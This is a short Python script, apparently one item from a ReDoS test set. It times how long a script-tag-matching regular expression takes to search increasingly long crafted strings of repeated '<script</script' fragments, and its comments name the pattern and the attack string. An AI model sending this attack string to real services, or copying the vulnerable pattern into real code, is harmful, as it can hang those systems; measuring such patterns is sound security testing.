# 7906
# &lt;script[\s\S]*?&lt;/script([\s\S]*?)&gt;
# EXPONENT
# nums:4
# EXPONENT AttackString:""+"&lt;script&lt;/script"*256+"! _1SLQ_2"

import re
from time import perf_counter

regex = """&lt;script[\s\S]*?&lt;/script([\s\S]*?)&gt;"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "&lt;script&lt;/script" * i * 1 + "! _1SLQ_2"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")